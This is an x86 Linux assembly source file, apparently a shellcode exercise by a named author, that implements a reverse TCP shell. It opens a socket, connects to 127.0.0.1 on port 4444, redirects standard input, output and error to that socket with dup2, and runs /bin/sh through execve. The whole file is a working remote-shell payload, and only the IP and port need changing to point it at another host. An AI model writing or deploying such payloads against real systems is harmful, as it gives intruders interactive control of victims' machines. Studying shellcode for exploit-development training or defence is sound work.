; Author: Robert Catalin Raducioiu (rbct)

global _start

section .text

_start:

    ; sys_socketcall
    xor eax, eax
    mov ebx, eax
    mov ecx, eax
    mov al, 102

    ; 3rd argument of socket(): IPPROTO_TCP
    mov cl, 6
    push ecx

    ; 1st argument of socketcall(): SYS_SOCKET
    ; 2nd argument of socket(): SOCK_STREAM (0x00000001)
    inc bl
    push ebx

    ; 1st argument of socket(): AF_INET
    mov cl, 2
    push ecx

    ; 2nd argument of socketcall(): pointer to the arguments for SYS_SOCKET call
    mov ecx, esp

    ; call syscall
    int 0x80

    ; save server socket file descriptor
    mov esi, eax

    ; inet_aton("127.0.0.1")
    ;rol ebx, 24
    ;push ebx
    push 0x0100007f
    ;mov [esp], BYTE 127
    
    ; 0x0002 -> AF_INET
    ; 0x115c -> htons(4444)
    push WORD 0x5c11

    mov bl, 2
    push WORD bx

    ; save the pointer to the struct for later
    mov ecx, esp
    
    ; 3rd argument of connect(): size of the struct
    ; push 16
    xor ebx, ebx
    mov bl, 16
    push ebx

    ; 2nd argument of connect(): pointer to the struct
    push ecx

    ; 1st argument of connect(): file descriptor of the server socket
    push esi
    
    ; syscall socketcall()
    xor eax, eax
    mov al, 102

    ; 1st argument of socketcall(): call SYS_CONNECT
    mov bl, 3

    ; 2nd argument of socketcall(): pointer to the parameters of bind()
    mov ecx, esp

    int 0x80

    ; loop counter (repeats dup2() three times)
    mov ecx, ebx

RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    mov al, 63

    ; Client file descriptor
    mov ebx, esi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate

    push ecx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp

    ; execve syscall
    xor eax, eax
    mov al, 11
    int 0x80
